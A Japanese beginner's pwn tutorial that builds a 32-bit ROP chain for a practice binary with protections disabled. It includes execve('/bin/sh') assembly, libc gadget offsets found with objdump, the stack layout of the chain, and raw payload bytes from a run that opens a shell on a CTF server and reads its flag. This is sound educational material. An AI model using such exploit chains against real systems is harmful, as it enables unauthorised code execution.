# PWNオーバーフロー入門: ROP abbrebiation of Return-Oriented-Programming (SSP、ASLR、PIE無効で32bit ELF)

## はじめに

いよいよReturn-Oriented-Programming (ROP)に挑戦。
以下の2つとの差分のみを書いているので分からないことがある場合は読んでみて下さい。

- [saru2017/pwn004: PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc経由でシェルを起動(SSP、ASLR、PIE無効で32bitELF)](https://github.com/saru2017/pwn004)
- [saru2017/pwn005: PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc関数を2回実行(SSP、ASLR、PIE無効で32bitELF)](https://github.com/saru2017/pwn005)
- [saru2017/pwn006: PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc関数を3回以上実行(SSP、ASLR、PIE無効で32bitELF)](https://github.com/saru2017/pwn006)


## 作らなければならないシェルコード

[saru2017/pwn003: PWNオーバーフロー入門: 関数の戻り番地を書き換えてシェルコードを実行(SSP、ASLR、PIE、NX無効で32bitELF)](https://github.com/saru2017/pwn003)を改めて見ながらどういう状態で`int 0x80`を呼び出さなければならないか考えてみる。

スタックの状態は
```
0xffffffe8: 0xfffffff0 #stackの"/bin//sh"が入っているアドレス
0xffffffec: 0x00000000
0xfffffff0: 0x6e69622f # "/bin" (リトルエンディアンなので)
0xfffffff4: 0x0068732f # "/sh"
0xfffffff8: 0x1
0xfffffffc: [関係なし]
```

レジスタの状態は

```
eax: 0x0b
ebx: 0xfffffff0 #"/bin/sh"が書かれているアドレス
ecx: 0xffffffe8 #スタックのトップのアドレス
edx: 0x0
esi: [関係なし]
edi: [関係なし]
ebp: 0x0
esp: 0xffffffe8 #スタックのトップのアドレス
eip: [関係なし]
```

[saru2017/pwn003: PWNオーバーフロー入門: 関数の戻り番地を書き換えてシェルコードを実行(SSP、ASLR、PIE、NX無効で32bitELF)](https://github.com/saru2017/pwn003)で作ったシェルコードを眺めながらさらにレジスタとスタックの必要最低限事項を考えてみる。

そうすると関係なしの事項が増える。

スタックの状態は必要最小限を考えると
```
0xffffffe8: 0xfffffff0 #stackの"/bin//sh"が入っているアドレス
0xffffffec: 0x00000000
0xfffffff0: 0x6e69622f # "/bin" (リトルエンディアンなので)
0xfffffff4: 0x0068732f # "/sh"
0xfffffff8: [関係なし]
0xfffffffc: [関係なし]
```

レジスタの状態は

```
eax: 0x0000000b #超重要！システムコールexecveを示す番号11
ebx: 0xfffffff0 #重要 "/bin/sh"が書かれているアドレス
ecx: 0xffffffe8 #重要 スタックのトップのアドレスをわざわざ入れてる
edx: 0x00000000 #重要 わざわざedxをゼロにしているところがある。
esi: [関係なし]
edi: [関係なし]
ebp: [関係なし]
esp: [関係なし] 
eip: [関係なし]
```

で、ここで[Return-oriented Programming (ROP) でDEPを回避してみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/26/014509)のROPコードをみていて気付いたのだが、int 80を読んだタイミングでecxに入ってるアドレスはスタックじゃなくてデータメモリでも良いみたい。


ということは重要なのは書き込みのできるデータメモリ領域のアドレスを入手することか。

## データメモリ経由でシェルを起動するアセンブラを書いてみる

まず`.comm buf, 0xAA`でメモリの領域を取ってみてはデータメモリのアドレスを調べる。

```
saru@lucifen:~/pwn007$ readelf -S a.out
There are 13 section headers, starting at offset 0x1194:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        00000114 000114 000013 00   A  0   0  1
  [ 2] .note.gnu.build-i NOTE            00000128 000128 000024 00   A  0   0  4
  [ 3] .gnu.hash         GNU_HASH        0000014c 00014c 000018 04   A  4   0  4
  [ 4] .dynsym           DYNSYM          00000164 000164 000010 10   A  5   1  4
  [ 5] .dynstr           STRTAB          00000174 000174 000001 00   A  0   0  1
  [ 6] .text             PROGBITS        00000175 000175 000019 00  AX  0   0  1
  [ 7] .eh_frame         PROGBITS        00000190 000190 000000 00   A  0   0  4
  [ 8] .dynamic          DYNAMIC         00001f90 000f90 000070 08  WA  5   0  4
  [ 9] .bss              NOBITS          00002000 001000 0000ac 00  WA  0   0 16
  [10] .symtab           SYMTAB          00000000 001000 000100 10     11  11  4
  [11] .strtab           STRTAB          00000000 001100 000026 00      0   0  1
  [12] .shstrtab         STRTAB          00000000 001126 00006e 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
saru@lucifen:~/pwn007$
```

WAとなっているところが書き込み可なのでdynamicかbssが使えそう。
とりあえずbssを使うことにする。

- 0x00002000: .bss

が、0x00002000に書き込むとSegmentation faultで落ちる。

gdb-pedaのinfo proc mappingで調べてみた。

```
gdb-peda$ info proc mapping
process 692
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x56555000 0x56556000     0x1000        0x0 /home/saru/pwn007/a.out
        0x56556000 0x56557000     0x1000        0x0 /home/saru/pwn007/a.out
        0x56557000 0x56558000     0x1000        0x0 [heap]
        0xf7fcf000 0xf7fd1000     0x2000        0x0
        0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
        0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
        0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
        0xf7ffc000 0xf7ffe000     0x2000    0x25000 /lib32/ld-2.27.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
gdb-peda$
```

`[heap]`が使えそうな気がするので`0x56557000`を使ってみる。→書き込めた。

ということは`.comm buf, 0xAA`はいらない？

```
gdb-peda$ i proc map
process 838
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x56555000 0x56556000     0x1000        0x0 /home/saru/pwn007/a.out
        0x56556000 0x56557000     0x1000        0x0 /home/saru/pwn007/a.out
        0xf7fcf000 0xf7fd1000     0x2000        0x0
        0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
        0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
        0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
        0xf7ffc000 0xf7ffe000     0x2000    0x25000 /lib32/ld-2.27.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
gdb-peda$
```

いや、いるようだ．．．
`.comm buf, 0xAA`がないとheapができないっぽい。
んー。readelfとかで本当にわかるんだろうか。

コマンドラインオプション変えてコンパイル

```
saru@lucifen:~/pwn007$ gcc -nostdlib -m32 -no-pie -fno-stack-protector test_execve_heap.s
```


```
gdb-peda$ info proc mapping
process 877
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/saru/pwn007/a.out
         0x8049000  0x804a000     0x1000        0x0 /home/saru/pwn007/a.out
        0xf7ff9000 0xf7ffc000     0x3000        0x0 [vvar]
        0xf7ffc000 0xf7ffe000     0x2000        0x0 [vdso]
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
gdb-peda$
```

```
saru@lucifen:~/pwn007$ readelf -S a.out
There are 7 section headers, starting at offset 0x1c0:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .note.gnu.build-i NOTE            08048094 000094 000024 00   A  0   0  4
  [ 2] .text             PROGBITS        080480b8 0000b8 000020 00  AX  0   0  1
  [ 3] .bss              NOBITS          080490e0 0000e0 0000ac 00  WA  0   0 16
  [ 4] .symtab           SYMTAB          00000000 0000d8 000090 10      5   4  4
  [ 5] .strtab           STRTAB          00000000 000168 00001d 00      0   0  1
  [ 6] .shstrtab         STRTAB          00000000 000185 000039 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
saru@lucifen:~/pwn007$
```

今回は`0x080490e0`で一致した。
書き込みもできた。

というわけでheapを使ったexecveの実行はできた。

```
        .intel_syntax noprefix
        .global _start
        .comm buf, 0xAA
_start:
        mov eax, 0x080490e0+8
        mov edx, 0x080490e0
        mov [edx], eax
        mov eax, 0x0
        mov edx, 0x080490e0+4
        mov [edx], eax
        mov eax, 0x6e69622f
        mov edx, 0x080490e0+8
        mov [edx], eax
        mov eax, 0x0068732f
        mov edx, 0x080490e0+12
        mov [edx], eax
        mov eax, 0xb
        mov ecx, 0x080490e0
        mov edx, 0x0
        mov ebx, 0x080490e0+8
        int 0x00000080
```

## 書き込みができるheapのアドレスを調べる

`readelf`で調べる。

```
saru@lucifen:~/pwn007$ readelf -S ./overflow07
There are 30 section headers, starting at offset 0x1794:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4
  [ 6] .dynstr           STRTAB          0804822c 00022c 00004f 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  23  4
  [11] .init             PROGBITS        080482c8 0002c8 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16
  [13] .plt.got          PROGBITS        08048330 000330 000008 08  AX  0   0  8
  [14] .text             PROGBITS        08048340 000340 0001f2 00  AX  0   0 16
  [15] .fini             PROGBITS        08048534 000534 000014 00  AX  0   0  4
  [16] .rodata           PROGBITS        08048548 000548 000008 00   A  0   0  4
  [17] .eh_frame_hdr     PROGBITS        08048550 000550 00004c 00   A  0   0  4
  [18] .eh_frame         PROGBITS        0804859c 00059c 00012c 00   A  0   0  4
  [19] .init_array       INIT_ARRAY      08049f0c 000f0c 000004 04  WA  0   0  4
  [20] .fini_array       FINI_ARRAY      08049f10 000f10 000004 04  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4
  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1
  [26] .comment          PROGBITS        00000000 001020 00002a 01  MS  0   0  1
  [27] .symtab           SYMTAB          00000000 00104c 000430 10     28  44  4
  [28] .strtab           STRTAB          00000000 00147c 000212 00      0   0  1
  [29] .shstrtab         STRTAB          00000000 00168e 000105 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
saru@lucifen:~/pwn007$
```

今回は.dataを使う。
メモリとしては4つもあれば十分なので足りる。

```
0x0804a018: .data
```


## libcの中の必要なアドレスを調べる

libcの中から「retで終わる」かつ「必要なコマンドがretの前にある」部分を探していく。

今回は以下の8個のガジェットを使う。
- pop    ecx;     pop    eax
- mov    DWORD PTR [ecx],eax
- pop    edx
- xor    eax,eax
- mov    DWORD PTR [edx+0x18],eax
- pop    ebx
- xor    edx,edx;         mov    eax,edx
- lea    eax,[edx+0xb]

それぞれのアドレスはobjdump -dを使って地道に調べていく。

```
objdump -d /lib32/libc.so.6  | grep -B2 ret | grep -A1 -B1 pop  | grep -A1 -B1 eax

   faa50:       59                      pop    %ecx
   faa51:       58                      pop    %eax
   faa52:       c3                      ret
```


```
   2be5e:       89 08                   mov    %ecx,(%eax)
   2be60:       c3                      ret
```


```
saru@lucifen:~/pwn007$ objdump -d /lib32/libc.so.6 | grep -B1 ret | grep -A1 pop | grep -A1 edx
   2d17c:       5a                      pop    %edx
   2d17d:       c3                      ret
```


```
   2e045:       31 c0                   xor    %eax,%eax
   2e047:       c3                      ret
```


```
   18be5:       5b                      pop    %ebx
   18be6:       c3                      ret
```

とここまで調べて自分で作りたくなった。
最低限以下の6つがあればできるのではという気がしてきた。

- pop eax
- pop ebx
- pop ecx
- pop edx
- mov DWORD PTR [e?x],e?x
- int 0x80

が、調べたところpop ecx; retだけ見つからないので他のと抱き合わせを用意した。

- 0x000faa51: pop eax
- 0x000faa50: pop ecx; pop eax
- 0x00018be5: pop ebx
- 0x00104412: pop ecx; pop ebx
- 0xXXXXXXXX: pop ecx (libcの中にはない)
- 0x0002d17b: pop ecx; pop edx
- 0x0002d17c: pop edx
- 0x0002d4c5: int 0x80

heapに書き込みは
- 0x000faa50: pop ecx; pop eax
- 0x0002be5e: mov DWORD PTR [eax],ecx


## ROPを組み立てる

### 動いているコードを分析

```
#dataaddrにdataaddr + 8を書き込む
        mov eax, 0x080490e0+8 
        mov edx, 0x080490e0
        mov [edx], eax
		
		
#dataaddr + 4に0を書き込む		
        mov eax, 0x0
        mov edx, 0x080490e0+4
        mov [edx], eax
		
#dataaddr + 8に0x6e69622f (/bin)を書き込む
        mov eax, 0x6e69622f
        mov edx, 0x080490e0+8
        mov [edx], eax

#dataaddr + 12に0x0069622f (/sh )を書き込む
        mov eax, 0x0068732f
        mov edx, 0x080490e0+12
        mov [edx], eax

#eaxに0xbを書き込む
        mov eax, 0xb
#ebxにdataaddr + 8を書き込む
        mov ebx, 0x080490e0+8
#ecxにdataaddrを書き込む
        mov ecx, 0x080490e0
#edxに0を書き込む
        mov edx, 0x0
#int 0x80
        int 0x00000080
```

### ROP: スタックはおいておいてガジェットの組み合わせだけ

```
#dataaddrにdataaddr + 8を書き込む
pop ecx; pop eax
mov [eax],ecx
#dataaddr + 4に0を書き込む		
pop ecx; pop eax
mov [eax],ecx
#dataaddr + 8に0x6e69622f (/bin)を書き込む
pop ecx; pop eax
mov [eax],ecx
#dataaddr + 12に0x0068732f (/sh )を書き込む
pop ecx; pop eax
mov [eax],ecx
#ebxにdataaddr + 8を書き込む
pop ebx
#ecxにdataaddrを書き込む
#eaxに0xbを書き込む
pop ecx; pop eax
#edxに0を書き込む
pop edx
#int 0x80
int 0x80
```

### ROP: スタックで考えてみる

```
#dataaddrにdataaddr + 8を書き込む
[[pop ecx; pop eax]]
[dataaddr + 8]
[dataaddr]
[[mov [eax],ecx]]

#dataaddr + 4に0を書き込む		
[[pop ecx; pop eax]]
[0x00000000]
[dataaddr + 4]
[[mov [eax],ecx]]

#dataaddr + 8に0x6e69622f (/bin)を書き込む
[[pop ecx; pop eax]]
[0x6e69622f]
[dataaddr + 8]
[[mov [eax],ecx]]


#dataaddr + 12に0x0068732f (/sh )を書き込む
[[pop ecx; pop eax]]
[0x6e69622f]
[dataaddr + 12]
[[mov [eax],ecx]]


#ebxにdataaddr + 8を書き込む
[[pop ebx]]
[dataaddr + 8]

#ecxにdataaddrを書き込む
#eaxに0xbを書き込む
[[pop ecx; pop eax]]
[dataaddr]
[0x0000000b]

#edxに0を書き込む
[[pop edx]]
[0x00000000]

#int 0x80
[[int 0x80]]
```

### 整形

```
[[pop ecx; pop eax]]
[dataaddr + 8]
[dataaddr]
[[mov [eax],ecx]]
[[pop ecx; pop eax]]
[0x00000000]
[dataaddr + 4]
[[mov [eax],ecx]]
[[pop ecx; pop eax]]
[0x6e69622f]
[dataaddr + 8]
[[mov [eax],ecx]]
[[pop ecx; pop eax]]
[0x0068732f]
[dataaddr + 12]
[[mov [eax],ecx]]
[[pop ebx]]
[dataaddr + 8]
[[pop ecx; pop eax]]
[dataaddr]
[0x0000000b]
[[pop edx]]
[0x00000000]
[[int 0x80]]
```


## writeを呼んでチェックした方が早そう？

### writeがint 0x80で実行される直前のレジスタ

```
[----------------------------------registers-----------------------------------]
EAX: 0x4
EBX: 0x0
ECX: 0x565555f0 ("AAAAA")
EDX: 0x5
ESI: 0xf7fc1000 --> 0x1d4d6c
EDI: 0x0
EBP: 0xffffd4b0 --> 0xffffd4f8 --> 0x0
ESP: 0xffffd4b0 --> 0xffffd4f8 --> 0x0
EIP: 0xf7fd5055 (<__kernel_vsyscall+5>: sysenter)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
```
### writeを直接実行するアセンブラ

```
        .intel_syntax noprefix
        .global _start
        .comm buf, 0xAA
_start:
        mov eax, 0x61616161
        mov edx, 0x08049100+0
        mov [edx], eax
        mov eax, 0x00000061
        mov edx, 0x08049100+4
        mov [edx], eax
        mov eax, 0x4
        mov ecx, 0x08049100
        mov edx, 0x5
        mov ebx, 0x0
        int 0x00000080
```

## exploitコード

```python

```

## 実行結果

```
saru@lucifen:~/pwn007$ python exploit07.py
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPj\xee\xf7 \xa0\x04\x08\x18\xa0\x04\x08^~\xe1\xf7Pj\xee\xf7\x00\x00\x00\x00\x1c\xa0\x04\x08^~\xe1\xf7Pj\xee\xf7/bin \xa0\x04\x08^~\xe1\xf7Pj\xee\xf7/sh\x00$\xa0\x04\x08^~\xe1\xf7\xe5K\xe0\xf7 \xa0\x04\x08Pj\xee\xf7\x18\xa0\x04\x08\x0b\x00\x00\x00|\x91\xe1\xf7\x00\x00\x00\x00\xc5\x94\xe1\xf7'
interact mode

cat flag.txt
flag is HANDAI_CTF

exit
*** Connection closed by remote host ***
saru@lucifen:~/pwn007$
```

## 重要そうなこと

- libcのロードアドレスはgdbでinfo proc mappingで調べるのが正しい
- PIE (Position Independent Execution)ついてると相対アドレスになるので

## 参考

- [gdbの使い方のメモ - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/05/03/044943)
- [Return-oriented Programming (ROP) でDEPを回避してみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/26/014509)
